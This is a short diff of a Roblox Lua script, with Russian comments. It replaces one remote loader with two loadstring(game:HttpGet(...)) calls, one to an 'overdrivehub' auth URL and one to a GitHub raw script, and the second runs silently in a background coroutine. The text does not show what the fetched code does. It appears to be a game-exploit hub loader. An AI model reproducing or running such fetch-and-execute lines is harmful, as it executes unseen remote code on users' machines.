@@ -1,1 +1,7 @@
-loadstring(game:HttpGet("https://paste.ee/r/1ZD93Ihp"))()
+-- Основной скрипт (запускается сразу)
+loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+
+-- Вторичный скрипт (работает в фоне)
+coroutine.wrap(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ODHUBytb/All-need-xx-script-veshi/refs/heads/main/x%20script%20base%20no%20deleting"))()
+end)()
